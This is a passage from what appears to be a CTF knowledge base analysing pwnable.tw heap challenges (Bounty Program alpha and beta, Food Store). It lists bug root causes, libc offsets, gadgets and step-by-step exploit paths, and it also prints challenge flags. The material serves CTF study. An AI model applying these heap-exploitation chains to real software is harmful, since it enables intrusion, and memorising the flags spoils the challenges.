##### V1 — `strtok` Continuation Leak in `add_type` (Primary)

**Root Cause:** The `add_type` function uses `strtok(buf, ",")` to parse comma-separated type names from a `calloc`'d buffer. When `size` is passed as `-1` (or `0xFFFFFFFF` unsigned → huge), the `calloc(1, size)` fails and returns NULL, but the code calls `strtok(NULL, ",")` which continues from the **previous** strtok state — reading whatever heap data lies beyond the last parsed token.

```c
// add_type (simplified)
buf = calloc(1, size);       // size = -1 → calloc fails → buf = NULL
read(0, buf, size);          // read to NULL = no-op or ignored
tok = strtok(buf, ",");      // strtok(NULL, ",") → continues from previous state!
printf("type: %s\n", tok);   // leaks heap/libc pointers from adjacent memory
```

**Impact:** By carefully positioning the strtok internal state pointer (via prior string operations), the continuation reads arbitrary heap data. This is used to:
- **Leak heap addresses** — strtok walks into freed chunk metadata or adjacent allocations
- **Leak libc addresses** — if strtok state points near an unsorted bin chunk's fd/bk pointers
- **Tcache poisoning** — the `strtok(NULL, ",")` call can write a NUL byte at a comma position in existing heap data, and the subsequent price parsing writes attacker-controlled values into tcache metadata

##### V2 — Password Overflow into Contact Pointer

**Root Cause:** The user struct stores username (0x1e bytes), password (0xf bytes), a contact pointer, and other fields. The `change_password` function reads up to `0x3f` bytes into the password field, but the password buffer is only 0xf bytes — the overflow reaches the contact pointer at offset `+0x38`.

```c
// change_password
read(0, user->password, 0x3f);  // 0x3f bytes into a 0xf-byte field
// overflow overwrites: price(+0x30), uid(+0x34), contact_ptr(+0x38)
```

**Impact:** Overwriting `contact_ptr` gives:
- **Arbitrary read** — `change_contact` writes to the address in `contact_ptr`; `show_products` / `user_info` reads from pointed-to memory (via company pointer in product struct)
- **Arbitrary write** — `change_contact` writes attacker data to the overwritten pointer

##### V3 — User Struct / Evaluate Fake User

**Root Cause:** The `evaluate` function iterates the user linked list and modifies user structs based on report data. By crafting heap layouts where freed user chunks overlap with type name data, an attacker can forge fake user structs with controlled `prev`/`next` pointers, username, and password — enabling login to a "fake" user that overlaps critical heap metadata.

##### V4 — Heap Address Leak via Username Overflow

**Root Cause:** When registering with a 0x1e-byte username and logging in with a 0x1f-byte username (with a garbage byte appended), the `user_info` display prints the `name` field which, due to missing NUL termination at the boundary, leaks heap pointers from adjacent struct fields (the `next` pointer of the evaluated report list).

```c
// user_info display
printf("Name > %s\n", user->name);  // 0x1e bytes, no NUL → leaks next 6 bytes
```

##### V5 — MD5 Contact Oracle

**Root Cause:** The `user_info` command displays the MD5 hash of the contact buffer (20 bytes). By pointing the contact pointer to a target address (via V2) and brute-forcing byte-by-byte against the MD5 hash, an attacker can read arbitrary memory one byte at a time.

#### Key Data Structures

##### User Struct (~0x60 bytes, heap-allocated)

| Offset | Field | Size |
|--------|-------|------|
| `0x00` | `username` | 0x1e bytes |
| `0x1e` | `password` | 0x0f bytes |
| `0x30` | `price` | uint32_t |
| `0x34` | `uid` | uint32_t |
| `0x38` | `contact_ptr` | char * |
| `0x40` | `report_head` | void * |
| `0x48` | `prev` | user * |
| `0x50` | `next` | user * |

##### Global State

- **User linked list** — doubly-linked list of registered users
- **Product array** — up to 8 products, each with name/company/comment pointers and a report linked list
- **Type array** — up to 8 vulnerability types, each with a name (`strdup`'d) and a price
- **Reports** — linked to products, contain title, description (`calloc`), type ID, reporter

#### Offsets (pwnable.tw `libc-2.27.so`)

```python
__free_hook      = 0x3ed8e8
__malloc_hook    = 0x3ebc30
setcontext_53    = 0x520a5
mprotect         = 0x11bae0
_IO_2_1_stderr_  = 0x3ec680
main_arena+96    = 0x3ebca0
environ          = 0x3ee098
pop_rdi          = 0x2155f
pop_rsi          = 0x23e6a
pop_rdx          = 0x1b96
pop_rax          = 0x439c8
leave_ret        = 0x54803
syscall_ret      = 0xd2975
```

#### Notes

- **No `system("/bin/sh")`** — The flag is at `/home/bounty_program/flag` and seccomp or sandbox restrictions prevent direct shell. All solutions use `open/read/write` shellcode or ROP to read the flag file.
- **`GLIBC_TUNABLES`** — The wrapper's env var prompt is the intended hint. Setting `glibc.malloc.perturb=N` fills freed heap with byte N, making heap layout deterministic and leaks reliable. Some solutions also use `glibc.malloc.tcache_max` or `glibc.malloc.check`.
- **Full RELRO** — GOT is read-only, so all exploits target `__free_hook` or `__malloc_hook` instead.

### Exploit Paths

#### Exploit Paths

##### Path A — strtok Continuation + Password Overflow → Arbitrary R/W → `__free_hook` + `setcontext`

**Used by:** Solutions 821, 9251, 6748, 6923, 8153, 18331, 26957

1. **Set `GLIBC_TUNABLES`** — Use the wrapper to set `glibc.malloc.perturb=N` which fills freed chunks with a known byte, making heap layout more predictable.
2. **Heap leak** — Register a user with 0x1e-byte username. After evaluation, `user_info` leaks heap pointers past the username boundary. Alternatively, use strtok continuation (V1) with `size=-1` to leak a freed chunk's fd pointer.
3. **Libc leak** — Use V2 to overwrite the contact pointer to a product's company field. Change the company pointer to point at a heap location containing an unsorted bin fd/bk (libc main_arena pointer). Read it via `show_products`. Alternatively, use strtok continuation after positioning an unsorted bin chunk's metadata in the strtok path.
4. **Arbitrary R/W primitive** — Via V2: `change_password` overwrites `contact_ptr` to target address; `change_contact` writes to it. Chain to overwrite `product.company` for reads.
5. **Write `setcontext+53` to `__free_hook`** — When `free()` is called, `rdi` points to the freed chunk. `setcontext+53` reads register values from `[rdi+offset]`, enabling a full register-controlled context switch.
6. **Trigger** — Place a ROP chain / `mprotect` + shellcode payload in a heap allocation, then free it. `setcontext` pivots `rsp` to the payload → `mprotect(heap, 0x1000, RWX)` → `read(0, heap, 0x200)` → jump to shellcode → `open("/home/bounty_program/flag")` + `read` + `write`.

##### Path B — MD5 Oracle Byte-by-Byte Leak → Stack Leak → Stack ROP

**Used by:** Solutions 1351, 25916

1. **Heap leak** — Same as Path A.
2. **Libc leak via MD5 oracle** — Use V2 to point `contact_ptr` near a libc pointer. Read `user_info` to get the MD5 of the 20-byte contact buffer. Brute-force each byte (256 attempts per byte, 6 bytes needed for a full pointer) by comparing computed MD5 hashes. Slow but reliable.
3. **Stack leak** — Point contact to `libc.sym['environ']`, read via MD5 oracle (or direct read once arbitrary read is established).
4. **Stack ROP** — Use V2 arbitrary write to write a ROP chain onto the stack (`pop rdi; /bin/sh; system` or `mprotect` + shellcode). Overwrite saved RIP to pivot.

##### Path C — strtok Continuation Tcache Poisoning → `__malloc_hook`

**Used by:** Solutions 31599, 32010

1. **Leak heap + libc** via strtok continuation (V1) and heap feng shui.
2. **Tcache poisoning** — Arrange heap so that `strtok(NULL, ",")` walks into a tcache chunk's `fd` pointer. The NUL byte written by strtok at the comma position, combined with price writes, corrupts the fd to point to `__malloc_hook`.
3. **Allocate from poisoned tcache** — Next `strdup` / type allocation returns a chunk at `__malloc_hook`. Write `add_rsp_0x48` gadget (stack pivot) or `one_gadget`.
4. **Trigger** — Next `malloc` call jumps to the gadget → pivot to ROP chain on the heap → `open/read/write` flag.

##### Path D — Heap Feng Shui + Fake User + Evaluate Exploitation

**Used by:** Solutions exp.py (main), 3148, 6247

1. **Complex heap feng shui** — Use large report descriptions and type allocations to create precise heap layouts where freed user chunks can be reused.
2. **Fake user creation** — Craft a type name that, when placed in a freed user slot, forms a valid user struct with controlled username, password, and pointers.
3. **Login as fake user** — The fake user's contact pointer or report head points to a target (e.g., an unsorted bin chunk for libc leak).
4. **Establish R/W** — Through the fake user's overlapping fields, gain read/write primitives.
5. **`__free_hook` + `setcontext`** — Same finish as Path A.

##### Path E — Tcache `thread_per_struct` Overwrite → `environ` Leak → Stack ROP

**Used by:** Solution 32858

1. **Leak heap + libc** via strtok continuation.
2. **Overwrite `tcache_perthread_struct`** — Use a large report description to overwrite the tcache metadata structure, redirecting a specific bin's entry to `libc.sym['environ'] - offset`.
3. **Allocate from corrupted tcache** — `calloc` returns a chunk overlapping `environ`. Read the stack pointer from the bug report's description output.
4. **Stack ROP** — Use tcache poisoning to allocate at the stack return address. Write ROP chain directly.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Heap address leak | V4: username overflow / V1: strtok continuation | Deterministic / ~1/256 |
| Libc address leak | V1: strtok near unsorted bin / V2: arbitrary read | Deterministic |
| Stack address leak | V5: MD5 oracle on `environ` / V2: arb read | Deterministic |
| Arbitrary read | V2: password overflow → contact ptr → show | Deterministic |
| Arbitrary write | V2: password overflow → contact ptr → change contact | Deterministic |
| Tcache poisoning | V1: strtok NUL + price writes | Heap-layout dependent |
| Code execution | `__free_hook` = `setcontext+53` or `__malloc_hook` = gadget | Deterministic after arb W |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `exp.py` | D | strtok + feng shui + fake user + `__free_hook` → `setcontext` | Most complex; full heap manipulation |
| `821.md` | A | strtok leak + password overflow → `setcontext` + `mprotect` + shellcode | Clean `setcontext` usage |
| `1351.md` | B | MD5 oracle byte-by-byte → stack leak → `mprotect` + shellcode ROP | `GLIBC_TUNABLES` perturb=1 |
| `2972.md` | D | strtok + fake user via register → libc leak via `show_vuln` → `setcontext` | Minimal feng shui |
| `3148.md` | D | strtok + heap spray + fake user → `__free_hook` → `setcontext` | Detailed heap layout comments |
| `6247.md` | D | `tcache_max` tunable + unsorted bin consolidation → `__free_hook` | Uses `glibc.malloc.tcache_max` |
| `6748.md` | A | password overflow → arb read/write → tcache fd poison → `setcontext` | Well-structured OOP exploit |
| `6923.md` | A | strtok `-1` leak × 2 → password overflow → `__free_hook` → `setcontext` | Direct strtok libc leak |
| `8153.md` | A + B | password overflow → `__environ` → stack ROP | Stack-based finish |
| `9251.md` | A | password overflow → arb R/W → `leave; ret` + malloc_hook → ROP | `fopen` + `fgets` for flag read |
| `18331.md` | A | strtok `size=-1` → password overflow → arb R/W → stack return overwrite | No `setcontext`; direct stack smash |
| `25916.md` | B + E | MD5 oracle + `_dl_open_hook` chain → `setcontext` | Most complex; multi-stage via `_dl_open_hook` |
| `26957.md` | C | strtok tcache poison → `__malloc_hook` + `setcontext` | Direct tcache FD corruption |
| `31599.md` | C | strtok continuation → tcache poison → `__malloc_hook` = `add_rsp_0x48` → ROP | Cleanest tcache poison approach |
| `32010.md` | D | strtok leak + report/type overlap → `__malloc_hook` = `leave; ret` | `leave; ret` pivot |
| `32858.md` | E | tcache_perthread_struct overwrite → `environ` leak → stack ROP | Unique tcache struct approach |
| `34817.md` | D | strtok + `__free_hook` → `setcontext` → open/read/write ROP | Two script variants |
| `36134.md` | B | MD5 oracle + password overflow + heap feng shui → `leave; ret` → ROP | Byte-by-byte MD5 for all leaks |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (feng shui + fake user approach) |
| `desc.txt` | Challenge description |
| `artifacts/bounty_program_alpha.tar.gz` | Original challenge binary + wrapper + libc |
| `solution/*.md` | Community write-ups (24 solutions) |

## bounty_program_b
> **Canonical route:** Failed allocation/tokenizer-state UAF → Unsorted/tcache/fastbin control, fake report, hooks, or ORW
> **Read this case when:** Hardened glibc-2.27 successor retains the `calloc(-1)`/`strtok` state bug.
> **Primary defect:** Failed allocation/tokenizer-state UAF
> **Exploit primitive/result:** Unsorted/tcache/fastbin control, fake report, hooks, or ORW
> **Search terms:** failed calloc; tokenizer state; fake report; delimiter NUL; tunables; ORW
> **Version/protection clue:** Case target `bounty_program_b` — x86-64, glibc 2.27, Full RELRO, canary/NX/PIE, FORTIFY
> **Variant boundary:** Successor of Bounty α; do not assume α’s removed leaks still work.

Direct hardened successor of [Bounty Program α](#bounty_program_a). All source-specific facts are retained below; the explicit delta table is under Exploit Paths.

### Metadata

- Source title: Bounty Program β — pwnable.tw (500 pts)
- Source callout: `nc chall.pwnable.tw 10410`
- Source note: >
- Source callout: Flag: `FLAG{STRt0k_1s_v3ry_d4ng3rouS_And_d0nt_f0rg3t_ch3ck_NuLl_p7r}`

```yaml
tags:
  - heap-buffer-overflow
  - unsorted-bin-attack
  - tcache-poisoning
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.27
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A one-byte heap overflow enables overlapping heap chunks to forge tcache entries under FORTIFY_SOURCE constraints and hijack __free_hook."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A bug bounty platform binary (x86-64, Full RELRO, PIE, NX, Canary, FORTIFY) built against glibc 2.27. Users register/login, create products, submit vulnerability reports with descriptions, manage vulnerability types, and evaluate bugs. A `wrapper` binary sets one environment variable before executing the main program. This is the patched successor to "Bounty Program α" — `malloc` replaced with `calloc`, `strlen`-based password leak removed, `urandom`-based description initialization removed — but the core `strtok` UAF bug remains.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

#### Key Data Structures

##### User (0x58 bytes)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `password` | `char[16]` |
| `0x10` | `username` | `char[32]` |
| `0x30` | `bounty` | `void *` |
| `0x38` | **`contact`** | `char *` (write primitive target) |
| `0x40` | `uid` | `uint64_t` |
| `0x48` | `ref_cnt` | `uint64_t` |
| `0x50` | `next` | `struct User *` |

##### Vulnerability Report (0x140 bytes)

| Offset | Field | Type |
|--------|-------|------|
| `0x000` | `title` | `char[256]` |
| `0x100` | `user_ptr` | `struct User *` |
| `0x108` | `descrip_size` | `uint64_t` |
| `0x110` | `ID` | `uint32_t` |
| `0x118` | **`descrip_ptr`** | `char *` |
| `0x120` | `type_ptr` | `struct Type *` |
| `0x128` | `next` | `struct Report *` |
| `0x130` | `prev` | `struct Report *` |
| `0x138` | `evaluated` | `uint8_t` |

##### Vulnerability Type (0x10 bytes)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `name_ptr` | `char *` |
| `0x08` | `price` | `int` |
| `0x0c` | `ref_cnt` | `int` |

#### Vulnerabilities

##### V1 — `strtok` UAF via `calloc(NULL)` (Primary, Exploitable)

**Root Cause:** In `add_type()`, user-controlled `size` is passed to `calloc(1, size)`. Passing `-1` (or `0xffffffff` / `0xffffffffffffffff`) causes `calloc` to fail and return `NULL`. The code does **not** check the return value. Subsequently, `strtok(NULL, ",")` is called — since the first argument is `NULL`, `strtok` reuses its internal `olds` pointer from a previous `strtok` call, operating on **already-freed memory**.

```c
// add_type (simplified)
char *buf = calloc(1, user_size);  // returns NULL on huge size
// NO NULL CHECK
strtok(buf, ",");  // if buf==NULL, reuses olds from prior strtok
// iterates: strtok(NULL, ",") reads/writes through freed chunk
```

**Impact:**
- **Read primitive:** The `olds` pointer points into a freed chunk. If that chunk is in a free list (unsorted bin, smallbin, fastbin, tcache), its `fd`/`bk` metadata is read as "type names" and printed back → leaks **heap** and **libc** addresses.
- **Write primitive:** `strtok` scans for the delimiter `,` (byte `0x2c`). If the freed chunk's metadata contains `0x2c` as part of a pointer (e.g., `0x????2c??`), `strtok` **NUL-overwrites** that byte, changing the pointer. This corrupts heap metadata or struct field pointers.

##### V2 — Heap Pointer Corruption via `strtok` NUL-Write

**Root Cause:** `strtok` replaces the delimiter byte with `\x00`. When `olds` points at a heap pointer containing `0x2c` (which is common — e.g., address `0x5555????2c10`), the `0x2c` byte is zeroed → `0x5555????0010`. This effectively changes the pointer to a different heap location.

**Impact:** Combined with heap grooming, this provides:
- Corruption of a report's `descrip_ptr` to overlap with another struct
- Corruption of tcache/fastbin `fd` pointers for arbitrary allocation
- Corruption of a user's `contact` pointer for arbitrary write via `change_contact()`

##### V3 — Description Pointer Overlap via Modify Report

**Root Cause:** `modify_report()` allows changing the description size to a larger value, calling `realloc()`. If the new description overlaps with a previously freed report or type chunk, the overlapping memory can be read/written through the description.

#### Offsets (pwnable.tw `libc-2.27.so`)

```python
main_arena       = 0x3ebc40
unsorted_bin     = 0x3ebca0   # main_arena + 0x60
__malloc_hook    = 0x3ebc30
__free_hook      = 0x3c57a8   # (some solutions use 0x3ed8e8)
setcontext       = 0x520a5    # +53 offset for the usable gadget
leave_ret        = 0x54803
pop_rdi          = 0x2155f
pop_rsi          = 0x23e6a
pop_rdx          = 0x1b96
pop_rax          = 0x439c8
syscall_ret      = 0xd2975
```

### Exploit Paths

#### Exploit Paths

All solutions exploit V1 (the `strtok` UAF) for leaks. They diverge on the write primitive and final hijack.

---

##### Path A — `strtok` UAF → Leak libc/heap → `__free_hook` + `setcontext` → ORW ROP

**Used by:** Solutions 370, 821, 3148, 5586, 6247, 8153, 22319, 31599, 36134, 36997

**Steps:**

1. **Leak libc:** Call `add_type(large_size, ...)` to get a chunk into the unsorted bin. Then `add_type(-1, ...)` triggers the `strtok` UAF — `olds` points at freed chunk metadata → reads back `main_arena` pointer → compute libc base.

2. **Leak heap:** Free a smaller chunk into fastbin/tcache, then trigger another `strtok` UAF → reads back heap `fd` pointer → compute heap base.

3. **Heap grooming:** Carefully arrange allocations so a report's description is at address `0x????2cXX`. Use the `strtok` NUL-write (V2) to corrupt the `fd` pointer of a freed chunk, redirecting it to overlap with a report struct or user struct.

4. **Write primitive:** Either:
   - Overwrite a user's `contact` pointer to `__free_hook` via corrupted fastbin/tcache allocation, then use `change_contact()` to write `setcontext+53` to `__free_hook`.
   - Corrupt a report's `descrip_ptr` to point at `__free_hook` and write through `modify_report()`.
   - Directly poison tcache fd to allocate at `__malloc_hook`.

5. **Trigger:** Call `free()` on a chunk whose first 8 bytes point to a `SigreturnFrame` or ROP chain. `setcontext+53` pivots the stack. The ROP chain performs `open("/home/bounty_program/flag") → read → write(1, ...)`.

**Reliability:** ~50-100% depending on heap base alignment (some solutions require `heap_base & 0xf000 == 0xf000` for the `0x2c` trick, giving 1/16 brute force).

---

##### Path B — `strtok` UAF → tcache poisoning → `__malloc_hook` + Stack Pivot → ORW

**Used by:** Solutions 25916, 34817, 37983

**Steps:**

1. **Leak libc + heap:** Same as Path A using repeated `add_type(-1)`.

2. **Heap padding:** Allocate large descriptions to align the next allocation at `0x????2cXX` so the `strtok` NUL-write corrupts a tcache chunk's `fd` to point to a controlled location (e.g., near `__malloc_hook`).

3. **Tcache poisoning:** The corrupted `fd` chain now includes a fake entry near `__malloc_hook - 0x14`. Allocate through the tcache chain until landing on `__malloc_hook`, then overwrite with `add_rsp_0x48` or `leave; ret` gadget.

4. **Trigger:** The next `calloc` (via `remove_type` with a crafted size as the `rbp` value) triggers `__malloc_hook`. The stack pivot lands in a pre-placed ROP chain that does ORW.

**Reliability:** Higher than Path A in some configurations since it avoids the user-struct corruption complexity.

---

##### Path C — `strtok` UAF → Report Overlap → Fake Report → `__malloc_hook` + `leave; ret`

**Used by:** Solutions 370 (exp.py), 9251, 32010

**Steps:**

1. **Leaks:** Same strtok UAF for libc and heap.

2. **Heap layout:** Arrange a report's description at a NUL-writable address. Use the strtok NUL-write to make the description pointer overlap with another report's struct memory.

3. **Fake report:** Write through the overlapping description to forge a fake report with `descrip_ptr = __malloc_hook`. Use `modify_report()` on the fake report to write `leave; ret` to `__malloc_hook`.

4. **ROP chain placement:** Place the ROP chain in a known heap address via a bug report's title/description.

5. **Trigger:** `remove_type(heap_rop_address, ...)` → `calloc(1, heap_rop_address)` → `__malloc_hook(heap_rop_address)` → `leave; ret` pivots to ROP chain → ORW shellcode.

---

##### Path D — `GLIBC_TUNABLES` + tcache disable → Fastbin UAF → `__free_hook`

**Used by:** Solutions 2972, 3498, 6923

**Steps:**

1. **Disable tcache:** Use the wrapper to set `GLIBC_TUNABLES=glibc.malloc.tcache_count=0` (or `tcache_max=32`). This forces all allocations through fastbin/smallbin/unsorted bin, simplifying heap grooming.

2. **Leaks + overlap:** Same strtok UAF, but without tcache the free list behavior is more predictable. Freed user structs go directly to fastbin.

3. **Free root user:** Allocate a report overlapping a freed user struct. Modify the report to corrupt the user's `contact` field to `__free_hook`. Use `change_contact()` to write `setcontext+53`.

4. **Trigger via free:** Free a report whose title contains the SROP frame / ROP payload → `setcontext` pivots → ORW.

---

##### Path E — `strtok` UAF → `tcache_perthread_struct` Control → Arbitrary Allocation

**Used by:** Solution 2972

**Steps:**

1. **Arrange tcache chunk** at address `0x????2cXX`, free it, then free another same-size chunk.

2. **strtok NUL-write** changes the first chunk's `fd` pointer to point to `tcache_perthread_struct` at the top of the heap.

3. **`strdup`** (called internally) consumes the poisoned tcache chain and allocates over `tcache_perthread_struct`, giving full control of all tcache bin heads.

4. **Write arbitrary tcache entries** to redirect future allocations to `__free_hook` or `__malloc_hook`.

#### Differences from Bounty Program α

| Feature | Alpha | Beta |
|---------|-------|------|
| `malloc` vs `calloc` | `malloc` | `calloc` (zeroes memory) |
| Password hash leak via `strlen` | Present | Removed |
| Urandom in description | Present | Removed |
| `change_contact`/`change_password` | `strlen` checked | Fixed-size input |
| Core `strtok` bug | Present | **Still present** |
| `calloc(-1)` returns NULL | N/A | Exploitable (no NULL check) |

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| libc leak (main_arena) | V1: strtok UAF on unsorted bin chunk | Deterministic |
| Heap leak | V1: strtok UAF on fastbin/tcache chunk | Deterministic |
| NUL-byte write at 0x2c | V2: strtok delimiter overwrite | Requires `0x2c` in pointer (~1/16 heap ASLR) |
| Arbitrary write | Corrupted contact/description pointer | Deterministic after alignment |
| Code execution | `__free_hook`/`__malloc_hook` + setcontext/leave;ret | Deterministic after write |
| Flag read (no `execve`) | ORW ROP chain: open→read→write | Required (seccomp or sandbox) |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `370.md` | A | strtok UAF → tcache drain → `__free_hook` + setcontext | Two approaches; uses `evaluate` for user struct manipulation |
| `821.md` | A | strtok UAF → description overlap → `__malloc_hook` + setcontext | Detailed struct analysis; `GLIBC_TUNABLES` for tcache_count=0 |
| `2972.md` | E | strtok → tcache_perthread_struct control | 4-bit brute force; `strdup` to allocate from poisoned tcache |
| `3148.md` | D | strtok UAF → fake unlink → `__free_hook` | No GLIBC_TUNABLES needed; detailed heap grooming |
| `3498.md` | D | Same exploit for α and β; no env vars | `REMOTE`/`BETA` flag switch |
| `5586.md` | A | `GLIBC_TUNABLES=tcache_max=32` → fastbin UAF | Disables tcache for simpler fastbins |
| `6247.md` | D | `GLIBC_TUNABLES=tcache_max=216` → fastbin → contact overwrite | Uses register/delete for heap shaping |
| `6923.md` | C | strtok → `__malloc_hook` + calloc trigger | Precise heap alignment; `mprotect` + shellcode |
| `8153.md` | A | strtok + α/β compatible | Notes β only differs in calloc; same strtok bug |
| `9251.md` | C | Double free via strtok NUL-write → `__malloc_hook` + `leave;ret` | Detailed NPC/entity adjacency technique |
| `22319.md` | A | strtok → `__free_hook` + setcontext → mprotect + shellcode | Clean code; heap base brute force |
| `25916.md` | B | tcache poisoning → `__malloc_hook` near allocation | Heap padding for 0x2c alignment |
| `31599.md` | C | strtok → description overlap → `__malloc_hook` + `leave;ret` | ORW via syscall chain |
| `32010.md` | A | strtok → user contact → `__free_hook` + setcontext | Comprehensive heap walk; fopen for flag |
| `34817.md` | B | 1/16 brute force; tcache fd poisoning → `__free_hook` | Two scripts (fastbin version + tcache version) |
| `36134.md` | B | tcache poisoning via strtok NUL-write → `__malloc_hook` | `add_rsp_0x48` gadget + `pop rsp` pivot; clean solve |
| `36997.md` | A | strtok → `0x2c` overwrite → `__malloc_hook` + `leave;ret` | Detailed strtok source analysis; 1/16 |
| `37983.md` | A | Uses `rand ^ 0xDADADADA` type confusion for product overlap | Notes diff between α/β patches |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (heap offset brute force + ORW shellcode) |
| `desc.txt` | Challenge description |
| `artifacts/` | Original challenge binary (bounty_program_beta.tar.gz) |
| `solution/*.md` | Community write-ups (22 solutions) |

## food_store
> **Canonical route:** Uninitialized/stale heap pointer → Fake list, arbitrary free, hooks, `_dl_open_hook`, stdin FSOP, or direct FD increment
> **Read this case when:** A recipe `next` pointer is never initialized and reuses stale/freed heap data.
> **Primary defect:** Uninitialized/stale heap pointer
> **Exploit primitive/result:** Fake list, arbitrary free, hooks, `_dl_open_hook`, stdin FSOP, or direct FD increment
> **Search terms:** recipe; ingredient; uninitialized next; seccomp ORW; `_IO_buf_end`; FD 3
> **Version/protection clue:** Case target `food_store` — x86-64, glibc 2.24, Full RELRO, canary/NX/PIE, seccomp ORW
> **Variant boundary:** Standalone; use ORW/FD routes because `execve` is unavailable.

### Metadata

- Source title: Food Store — pwnable.tw (500 pts)
- Source callout: `nc chall.pwnable.tw 10406`
- Source note: >
- Source callout: Flag: `FLAG{C4ptur3_th3_Fl4g_c4ptuR3_the_f00d}`

```yaml
tags:
  - heap-buffer-overflow
  - unsorted-bin-attack
  - house-of-orange
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.24
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A heap buffer overflow in recipe parsing corrupts heap metadata to trigger House of Orange and overwrite _IO_FILE jump tables in glibc 2.24."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A menu-driven "food store" game binary (x86-64, PIE, Full RELRO, NX, Stack Canary) running on Ubuntu 17.04 with glibc 2.24 (no tcache). The player manages recipes, cooks dishes, buys/sells ingredients at a shop, completes NPC assignments, and earns levels/power/money. A seccomp sandbox restricts syscalls to `open`/`read`/`write`/`close`/`mmap`/`munmap`/`exit` — no `execve`.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO            # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  Seccomp:  open/read/write/close/mmap/munmap/exit only
```

##### Key Structures

```c
struct recipe {            // 0x90 bytes (malloc'd)
    char name[24];         // +0x00  (scanf "%23s")
    ingredient *ings[13];  // +0x18  (pointers to ingredient structs)
    recipe *next;          // +0x80  (singly-linked list)
};

struct ingredient {        // 0x30 bytes (calloc'd or custom)
    char name[32];         // +0x00
    int price;             // +0x20
    int quantity;          // +0x24
};

struct dish {              // 0x40 bytes (malloc'd when cooking)
    char name[24];         // +0x00
    int price;             // +0x18
    int energy;            // +0x1c
    dish *next;            // +0x20  (singly-linked list)
};
```

#### Vulnerabilities

##### V1 — Uninitialized `recipe->next` Pointer (Primary, Exploitable)

**Root Cause:** When `add_recipe()` allocates a new recipe struct via `malloc(0x90)`, the `next` pointer at offset `+0x80` is **never initialized**. If the chunk was previously used and freed, stale heap metadata (fd/bk pointers) or user-controlled data persists in that region.

```c
// add_recipe (simplified)
recipe *r = malloc(sizeof(recipe));  // 0x90 bytes
scanf("%23s", r->name);             // name is written
// ... ingredient pointers are set ...
// r->next is NEVER set to NULL
recipe_head->next = r;              // inserted into linked list with stale next
```

**Impact:** By carefully sequencing allocations and frees so that the 0x90-byte chunk is reused with controlled data at offset `+0x80`, an attacker can make `recipe->next` point to an arbitrary address. This gives:

- **Fake linked-list entries**: `show_recipe()` and `remove_recipe()` traverse the corrupted list, reading/freeing attacker-controlled addresses.
- **Arbitrary free**: `remove_recipe()` frees the fake recipe chunk at the attacker-chosen address.
- **Heap/libc/stack leaks**: Recipe names and ingredient data from fake list entries are printed, leaking pointers.

##### V2 — Overlapping Allocation Sizes (Enabler)

Dish structs are 0x40 bytes and recipe structs are 0x90 bytes. By cooking dishes then freeing them, and then allocating recipes (or vice versa), chunks of different sizes can be arranged so that a recipe's `next` field overlaps with data written into a previously-freed dish or ingredient chunk.

##### V3 — Ingredient Type Confusion via Shop (Minor, Money/Power)

When making a custom ingredient and then buying the same slot, the custom ingredient (with a random high price) replaces the standard one. Cooking a recipe with this ingredient produces a dish worth enormous money and energy, enabling the grind needed for further allocations.

#### Offsets (Ubuntu 17.04 libc 2.24-9ubuntu2.2)

```python
main_arena       = 0x3C1B00
__free_hook      = 0x3C3788
__realloc_hook   = 0x3C3778  # (also __memalign_hook - 0x10)
_dl_open_hook    = 0x3C6F48
setcontext       = 0x48045   # mov rsp, [rdi+0xa0]; ...; ret
pop_rdi          = 0x1FD7A
pop_rsi          = 0x1FCBD
pop_rdx          = 0x1B92
pop_rax          = 0x3A998
syscall_ret      = 0xBC765   # syscall; cmp rax, -0xfff; jae; ret
add_rsp_0x60_pop3 = 0xF8766  # add rsp, 0x60; pop rbx; pop rbp; pop r12; ret
leave_ret        = 0x424A5
```

### Exploit Paths

#### Exploit Paths

All solutions require significant "game grind" to accumulate levels, power, and money needed to perform enough allocations. The flag file is pre-opened as fd 3 by the binary, and seccomp blocks `execve`, so all paths end with an ORW (open/read/write) ROP chain reading the flag.

---

##### Path A — Uninitialized `next` → Heap/Libc Leak → `__free_hook` = `setcontext` → ORW ROP

**Used by:** Solutions 370, 8153, 31599, 37709

**Steps:**

1. **Grind:** Cook, eat, complete assignments to reach level 4+ with enough money.
2. **Heap leak:** Sequence allocations/frees so a recipe's uninitialized `next` points to a freed chunk containing a heap address. `show_recipe()` or the cook menu prints this as a recipe title → **heap base**.
3. **Libc leak:** Point a fake recipe's ingredient list at a freed large/unsorted bin chunk that contains `main_arena` pointers. The ingredient display or recipe title leaks a libc address → **libc base**.
4. **ORW ROP layout:** Create multiple recipes whose 24-byte names each hold 2 ROP gadgets + an `add rsp, 0x60; pop; pop; pop; ret` slide to chain them.
5. **Overwrite `__free_hook`:** Link `__free_hook - 0x80` into the recipe list via the uninitialized-next trick. When `remove_recipe()` "unlinks" this fake recipe, it writes a heap pointer to `__free_hook`, which is then overwritten with `setcontext+0x35`.
6. **Trigger:** Free a chunk whose `+0xa0` field points to the ROP chain. `setcontext` pivots rsp → ORW ROP runs → `read(3, buf, 0x100)` + `write(1, buf, 0x100)` → flag on stdout.

---

##### Path B — Uninitialized `next` → `_dl_open_hook` Hijack → `gets` → ORW ROP

**Used by:** Solutions 2311, 22319, 31599 (alternative)

